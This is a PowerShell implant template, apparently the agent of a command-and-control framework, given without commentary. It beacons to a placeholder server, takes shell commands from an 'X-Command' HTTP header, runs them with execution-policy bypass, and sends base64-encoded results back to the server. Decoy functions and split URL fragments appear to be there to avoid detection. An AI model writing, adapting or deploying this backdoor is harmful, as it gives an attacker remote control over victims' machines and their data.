 $Body = @{
    User = 'jdoe'
    password = 'P@S$w0rd!'
}
$sleep=9

function RemotePlayAudio {
    $args[0]
    }

function JfaSlt () {}

# Core

while($true){
    start-sleep($sleep)
    # write-output "Callback time: $sleep"
    $headers = @{}
    $headers.Add("X-Implant","{{ uii }}")
    try {
        $LoginResponse = Invoke-WebRequest 'http://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST'
        }
    catch {
        $_.Exception | format-list -Force
    }
    $headers = $LoginResponse.Headers["X-Command"]
    # write-output $headers
    if ( $headers -NotLike "=="){
        if ( $headers -Like "::")
            {
            $SplitHeaders = $heades.Split("::")
            Write-Output $SplitHeaders[2]
            }
        else {
        Write-Output "$headers"
        $tr = powershell.exe -exec bypass -C "$headers"
        $gtr="{{uii}}::"+$tr
        $headers = @{}
        $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
        $headers.Add("X-Result",$b64tr)
        Write-Output $b64tr


        $LoginResponse = Invoke-WebRequest 'http://{{ url }}:{{ port }}/help' -Headers $headers -Body $Body -Method 'POST'
        }
    }

}

$a="ht"
#Andfunc2()
$i="://"
#randomfun()
$hi="tp"
